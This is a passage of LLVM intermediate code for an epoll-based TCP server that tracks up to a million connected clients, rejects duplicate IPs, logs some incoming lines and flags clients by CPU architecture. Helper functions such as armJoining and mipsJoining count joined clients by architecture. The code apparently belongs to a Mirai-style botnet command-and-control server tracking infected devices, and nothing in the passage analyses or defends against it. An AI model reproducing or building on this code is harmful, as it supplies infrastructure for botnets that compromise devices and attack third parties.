  %96 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %95, i32 0, i32 3
  store i8 0, i8* %96, align 2
  %97 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %98 = load i32, i32* %7, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %97, i64 %99
  %101 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %100, i32 0, i32 1
  %102 = bitcast %union.epoll_data* %101 to i32*
  %103 = load i32, i32* %102, align 1
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %104
  %106 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %105, i32 0, i32 1
  store i8 0, i8* %106, align 4
  %107 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %108 = load i32, i32* %7, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %107, i64 %109
  %111 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %110, i32 0, i32 1
  %112 = bitcast %union.epoll_data* %111 to i32*
  %113 = load i32, i32* %112, align 1
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %114
  %116 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %115, i32 0, i32 5
  store i8 0, i8* %116, align 4
  %117 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %118 = load i32, i32* %7, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %117, i64 %119
  %121 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %120, i32 0, i32 1
  %122 = bitcast %union.epoll_data* %121 to i32*
  %123 = load i32, i32* %122, align 1
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %124
  %126 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %125, i32 0, i32 6
  store i8 0, i8* %126, align 1
  %127 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %128 = load i32, i32* %7, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %127, i64 %129
  %131 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %130, i32 0, i32 1
  %132 = bitcast %union.epoll_data* %131 to i32*
  %133 = load i32, i32* %132, align 1
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %134
  %136 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %135, i32 0, i32 9
  store i8 0, i8* %136, align 4
  %137 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %138 = load i32, i32* %7, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %137, i64 %139
  %141 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %140, i32 0, i32 1
  %142 = bitcast %union.epoll_data* %141 to i32*
  %143 = load i32, i32* %142, align 1
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %144
  %146 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %145, i32 0, i32 10
  store i8 0, i8* %146, align 1
  %147 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %148 = load i32, i32* %7, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %147, i64 %149
  %151 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %150, i32 0, i32 1
  %152 = bitcast %union.epoll_data* %151 to i32*
  %153 = load i32, i32* %152, align 1
  %154 = call i32 @close(i32 %153)
  br label %450

155:                                              ; preds = %47
  %156 = load volatile i32, i32* @listenFD, align 4
  %157 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %158 = load i32, i32* %7, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %157, i64 %159
  %161 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %160, i32 0, i32 1
  %162 = bitcast %union.epoll_data* %161 to i32*
  %163 = load i32, i32* %162, align 1
  %164 = icmp eq i32 %156, %163
  br i1 %164, label %165, label %264

165:                                              ; preds = %155
  br label %166

166:                                              ; preds = %165, %229, %232, %256
  store i32 16, i32* %9, align 4
  %167 = load volatile i32, i32* @listenFD, align 4
  %168 = call i32 @accept(i32 %167, %struct.sockaddr* %8, i32* %9)
  store i32 %168, i32* %10, align 4
  %169 = load i32, i32* %10, align 4
  %170 = icmp eq i32 %169, -1
  br i1 %170, label %171, label %181

171:                                              ; preds = %166
  %172 = call i32* @__errno_location() #9
  %173 = load i32, i32* %172, align 4
  %174 = icmp eq i32 %173, 11
  br i1 %174, label %179, label %175

175:                                              ; preds = %171
  %176 = call i32* @__errno_location() #9
  %177 = load i32, i32* %176, align 4
  %178 = icmp eq i32 %177, 11
  br i1 %178, label %179, label %180

179:                                              ; preds = %175, %171
  br label %263

180:                                              ; preds = %175
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i64 0, i64 0))
  br label %263

181:                                              ; preds = %166
  %182 = bitcast %struct.sockaddr* %8 to %struct.sockaddr_in*
  %183 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %182, i32 0, i32 2
  %184 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %183, i32 0, i32 0
  %185 = load i32, i32* %184, align 2
  %186 = load i32, i32* %10, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %187
  %189 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %188, i32 0, i32 0
  store i32 %185, i32* %189, align 4
  store i32 0, i32* %12, align 4
  store i32 0, i32* %11, align 4
  br label %190

190:                                              ; preds = %219, %181
  %191 = load i32, i32* %11, align 4
  %192 = icmp slt i32 %191, 1000000
  br i1 %192, label %193, label %222

193:                                              ; preds = %190
  %194 = load i32, i32* %11, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %195
  %197 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %196, i32 0, i32 12
  %198 = load i8, i8* %197, align 1
  %199 = icmp ne i8 %198, 0
  br i1 %199, label %200, label %204

200:                                              ; preds = %193
  %201 = load i32, i32* %11, align 4
  %202 = load i32, i32* %10, align 4
  %203 = icmp eq i32 %201, %202
  br i1 %203, label %204, label %205

204:                                              ; preds = %200, %193
  br label %219

205:                                              ; preds = %200
  %206 = load i32, i32* %11, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %207
  %209 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %208, i32 0, i32 0
  %210 = load i32, i32* %209, align 4
  %211 = load i32, i32* %10, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %212
  %214 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %213, i32 0, i32 0
  %215 = load i32, i32* %214, align 4
  %216 = icmp eq i32 %210, %215
  br i1 %216, label %217, label %218

217:                                              ; preds = %205
  store i32 1, i32* %12, align 4
  br label %222

218:                                              ; preds = %205
  br label %219

219:                                              ; preds = %218, %204
  %220 = load i32, i32* %11, align 4
  %221 = add nsw i32 %220, 1
  store i32 %221, i32* %11, align 4
  br label %190, !llvm.loop !12

222:                                              ; preds = %217, %190
  %223 = load i32, i32* %12, align 4
  %224 = icmp ne i32 %223, 0
  br i1 %224, label %225, label %235

225:                                              ; preds = %222
  %226 = load i32, i32* %10, align 4
  %227 = call i64 @send(i32 %226, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0), i64 8, i32 16384)
  %228 = icmp eq i64 %227, -1
  br i1 %228, label %229, label %232

229:                                              ; preds = %225
  %230 = load i32, i32* %10, align 4
  %231 = call i32 @close(i32 %230)
  br label %166

232:                                              ; preds = %225
  %233 = load i32, i32* %10, align 4
  %234 = call i32 @close(i32 %233)
  br label %166

235:                                              ; preds = %222
  %236 = load i32, i32* %10, align 4
  %237 = call i32 @make_socket_non_blocking(i32 %236)
  store i32 %237, i32* %5, align 4
  %238 = load i32, i32* %5, align 4
  %239 = icmp eq i32 %238, -1
  br i1 %239, label %240, label %243

240:                                              ; preds = %235
  %241 = load i32, i32* %10, align 4
  %242 = call i32 @close(i32 %241)
  br label %263

243:                                              ; preds = %235
  %244 = load i32, i32* %10, align 4
  %245 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 1
  %246 = bitcast %union.epoll_data* %245 to i32*
  store i32 %244, i32* %246, align 1
  %247 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 0
  store i32 -2147483647, i32* %247, align 1
  %248 = load volatile i32, i32* @epollFD, align 4
  %249 = load i32, i32* %10, align 4
  %250 = call i32 @epoll_ctl(i32 %248, i32 1, i32 %249, %struct.epoll_event* %3) #10
  store i32 %250, i32* %5, align 4
  %251 = load i32, i32* %5, align 4
  %252 = icmp eq i32 %251, -1
  br i1 %252, label %253, label %256

253:                                              ; preds = %243
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.7, i64 0, i64 0))
  %254 = load i32, i32* %10, align 4
  %255 = call i32 @close(i32 %254)
  br label %263

256:                                              ; preds = %243
  %257 = load i32, i32* %10, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %258
  %260 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %259, i32 0, i32 12
  store i8 1, i8* %260, align 1
  %261 = load i32, i32* %10, align 4
  %262 = call i64 @send(i32 %261, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.8, i64 0, i64 0), i64 9, i32 16384)
  br label %166

263:                                              ; preds = %253, %240, %180, %179
  br label %450

264:                                              ; preds = %155
  %265 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %266 = load i32, i32* %7, align 4
  %267 = sext i32 %266 to i64
  %268 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %265, i64 %267
  %269 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %268, i32 0, i32 1
  %270 = bitcast %union.epoll_data* %269 to i32*
  %271 = load i32, i32* %270, align 1
  store i32 %271, i32* %13, align 4
  %272 = load i32, i32* %13, align 4
  %273 = sext i32 %272 to i64
  %274 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %273
  store %struct.clientdata_t* %274, %struct.clientdata_t** %14, align 8
  store i32 0, i32* %15, align 4
  %275 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %276 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %275, i32 0, i32 12
  store i8 1, i8* %276, align 1
  %277 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %278 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %277, i32 0, i32 4
  store i8 0, i8* %278, align 1
  %279 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %280 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %279, i32 0, i32 2
  store i8 0, i8* %280, align 1
  %281 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %282 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %281, i32 0, i32 3
  store i8 0, i8* %282, align 2
  %283 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %284 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %283, i32 0, i32 1
  store i8 0, i8* %284, align 4
  %285 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %286 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %285, i32 0, i32 5
  store i8 0, i8* %286, align 4
  %287 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %288 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %287, i32 0, i32 6
  store i8 0, i8* %288, align 1
  %289 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %290 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %289, i32 0, i32 9
  store i8 0, i8* %290, align 4
  %291 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %292 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %291, i32 0, i32 10
  store i8 0, i8* %292, align 1
  br label %293

293:                                              ; preds = %264, %422
  %294 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %294, i8 0, i64 2048, i1 false)
  br label %295

295:                                              ; preds = %405, %404, %399, %317, %293
  %296 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %296, i8 0, i64 2048, i1 false)
  %297 = icmp ne i8* %296, null
  br i1 %297, label %298, label %304

298:                                              ; preds = %295
  %299 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %300 = load i32, i32* %13, align 4
  %301 = call i32 @fdgets(i8* %299, i32 2048, i32 %300)
  %302 = sext i32 %301 to i64
  store i64 %302, i64* %16, align 8
  %303 = icmp sgt i64 %302, 0
  br label %304

304:                                              ; preds = %298, %295
  %305 = phi i1 [ false, %295 ], [ %303, %298 ]
  br i1 %305, label %306, label %408

306:                                              ; preds = %304
  %307 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %308 = call i8* @strstr(i8* %307, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0)) #8
  %309 = icmp eq i8* %308, null
  br i1 %309, label %310, label %311

310:                                              ; preds = %306
  store i32 1, i32* %15, align 4
  br label %408

311:                                              ; preds = %306
  %312 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @trim(i8* %312)
  %313 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %314 = call i8* @strstr(i8* %313, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i64 0, i64 0)) #8
  %315 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %316 = icmp eq i8* %314, %315
  br i1 %316, label %317, label %326

317:                                              ; preds = %311
  %318 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %319 = call i8* @strstr(i8* %318, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i64 0, i64 0)) #8
  %320 = getelementptr inbounds i8, i8* %319, i64 7
  store i8* %320, i8** %18, align 8
  %321 = load %struct._IO_FILE*, %struct._IO_FILE** @fileFD, align 8
  %322 = load i8*, i8** %18, align 8
  %323 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %321, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i64 0, i64 0), i8* %322)
  %324 = load %struct._IO_FILE*, %struct._IO_FILE** @fileFD, align 8
  %325 = call i32 @fflush(%struct._IO_FILE* %324)
  br label %295, !llvm.loop !13

326:                                              ; preds = %311
  %327 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %328 = call i8* @strstr(i8* %327, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.11, i64 0, i64 0)) #8
  %329 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %330 = icmp eq i8* %328, %329
  br i1 %330, label %331, label %334

331:                                              ; preds = %326
  %332 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %333 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %332, i32 0, i32 1
  store i8 1, i8* %333, align 4
  br label %334

334:                                              ; preds = %331, %326
  %335 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %336 = call i8* @strstr(i8* %335, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.12, i64 0, i64 0)) #8
  %337 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %338 = icmp eq i8* %336, %337
  br i1 %338, label %339, label %342

339:                                              ; preds = %334
  %340 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %341 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %340, i32 0, i32 2
  store i8 1, i8* %341, align 1
  br label %342

342:                                              ; preds = %339, %334
  %343 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %344 = call i8* @strstr(i8* %343, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.13, i64 0, i64 0)) #8
  %345 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %346 = icmp eq i8* %344, %345
  br i1 %346, label %347, label %350

347:                                              ; preds = %342
  %348 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %349 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %348, i32 0, i32 3
  store i8 1, i8* %349, align 2
  br label %350

350:                                              ; preds = %347, %342
  %351 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %352 = call i8* @strstr(i8* %351, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.14, i64 0, i64 0)) #8
  %353 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %354 = icmp eq i8* %352, %353
  br i1 %354, label %355, label %358

355:                                              ; preds = %350
  %356 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %357 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %356, i32 0, i32 4
  store i8 1, i8* %357, align 1
  br label %358

358:                                              ; preds = %355, %350
  %359 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %360 = call i8* @strstr(i8* %359, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.15, i64 0, i64 0)) #8
  %361 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %362 = icmp eq i8* %360, %361
  br i1 %362, label %363, label %366

363:                                              ; preds = %358
  %364 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %365 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %364, i32 0, i32 6
  store i8 1, i8* %365, align 1
  br label %366

366:                                              ; preds = %363, %358
  %367 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %368 = call i8* @strstr(i8* %367, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.16, i64 0, i64 0)) #8
  %369 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %370 = icmp eq i8* %368, %369
  br i1 %370, label %371, label %374

371:                                              ; preds = %366
  %372 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %373 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %372, i32 0, i32 5
  store i8 1, i8* %373, align 4
  br label %374

374:                                              ; preds = %371, %366
  %375 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %376 = call i8* @strstr(i8* %375, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.17, i64 0, i64 0)) #8
  %377 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %378 = icmp eq i8* %376, %377
  br i1 %378, label %379, label %382

379:                                              ; preds = %374
  %380 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %381 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %380, i32 0, i32 9
  store i8 1, i8* %381, align 4
  br label %382

382:                                              ; preds = %379, %374
  %383 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %384 = call i8* @strstr(i8* %383, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.18, i64 0, i64 0)) #8
  %385 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %386 = icmp eq i8* %384, %385
  br i1 %386, label %387, label %390

387:                                              ; preds = %382
  %388 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %389 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %388, i32 0, i32 10
  store i8 1, i8* %389, align 1
  br label %390

390:                                              ; preds = %387, %382
  %391 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %392 = call i32 @strcmp(i8* %391, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %393 = icmp eq i32 %392, 0
  br i1 %393, label %394, label %400

394:                                              ; preds = %390
  %395 = load i32, i32* %13, align 4
  %396 = call i64 @send(i32 %395, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.19, i64 0, i64 0), i64 5, i32 16384)
  %397 = icmp eq i64 %396, -1
  br i1 %397, label %398, label %399

398:                                              ; preds = %394
  store i32 1, i32* %15, align 4
  br label %408

399:                                              ; preds = %394
  br label %295, !llvm.loop !13

400:                                              ; preds = %390
  %401 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %402 = call i32 @strcmp(i8* %401, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0)) #8
  %403 = icmp eq i32 %402, 0
  br i1 %403, label %404, label %405

404:                                              ; preds = %400
  br label %295, !llvm.loop !13

405:                                              ; preds = %400
  %406 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %407 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.21, i64 0, i64 0), i8* %406)
  br label %295, !llvm.loop !13

408:                                              ; preds = %398, %310, %304
  %409 = load i64, i64* %16, align 8
  %410 = icmp eq i64 %409, -1
  br i1 %410, label %411, label %417

411:                                              ; preds = %408
  %412 = call i32* @__errno_location() #9
  %413 = load i32, i32* %412, align 4
  %414 = icmp ne i32 %413, 11
  br i1 %414, label %415, label %416

415:                                              ; preds = %411
  store i32 1, i32* %15, align 4
  br label %416

416:                                              ; preds = %415, %411
  br label %423

417:                                              ; preds = %408
  %418 = load i64, i64* %16, align 8
  %419 = icmp eq i64 %418, 0
  br i1 %419, label %420, label %421

420:                                              ; preds = %417
  store i32 1, i32* %15, align 4
  br label %423

421:                                              ; preds = %417
  br label %422

422:                                              ; preds = %421
  br label %293

423:                                              ; preds = %420, %416
  %424 = load i32, i32* %15, align 4
  %425 = icmp ne i32 %424, 0
  br i1 %425, label %426, label %447

426:                                              ; preds = %423
  %427 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %428 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %427, i32 0, i32 12
  store i8 0, i8* %428, align 1
  %429 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %430 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %429, i32 0, i32 4
  store i8 0, i8* %430, align 1
  %431 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %432 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %431, i32 0, i32 2
  store i8 0, i8* %432, align 1
  %433 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %434 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %433, i32 0, i32 3
  store i8 0, i8* %434, align 2
  %435 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %436 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %435, i32 0, i32 1
  store i8 0, i8* %436, align 4
  %437 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %438 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %437, i32 0, i32 5
  store i8 0, i8* %438, align 4
  %439 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %440 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %439, i32 0, i32 6
  store i8 0, i8* %440, align 1
  %441 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %442 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %441, i32 0, i32 9
  store i8 0, i8* %442, align 4
  %443 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %444 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %443, i32 0, i32 10
  store i8 0, i8* %444, align 1
  %445 = load i32, i32* %13, align 4
  %446 = call i32 @close(i32 %445)
  br label %447

447:                                              ; preds = %426, %423
  br label %448

448:                                              ; preds = %447
  br label %449

449:                                              ; preds = %448
  br label %450

450:                                              ; preds = %449, %263, %56
  %451 = load i32, i32* %7, align 4
  %452 = add nsw i32 %451, 1
  store i32 %452, i32* %7, align 4
  br label %25, !llvm.loop !14

453:                                              ; preds = %25
  br label %21
}

; Function Attrs: nounwind
declare noalias align 16 i8* @calloc(i64, i64) #4

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #3

declare void @perror(i8*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @make_socket_non_blocking(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

10:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.96, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

11:                                               ; preds = %1
  %12 = load i32, i32* %4, align 4
  %13 = or i32 %12, 2048
  store i32 %13, i32* %4, align 4
  %14 = load i32, i32* %3, align 4
  %15 = load i32, i32* %4, align 4
  %16 = call i32 (i32, i32, ...) @fcntl(i32 %14, i32 4, i32 %15)
  store i32 %16, i32* %5, align 4
  %17 = load i32, i32* %5, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %11
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.96, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

20:                                               ; preds = %11
  store i32 0, i32* %2, align 4
  br label %21

21:                                               ; preds = %20, %19, %10
  %22 = load i32, i32* %2, align 4
  ret i32 %22
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #4

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8*, i8*) #2

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

declare i32 @fflush(%struct._IO_FILE*) #1

declare i32 @printf(i8*, ...) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @armJoining() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 4
  %11 = load i8, i8* %10, align 1
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !15

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @mipsJoining() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
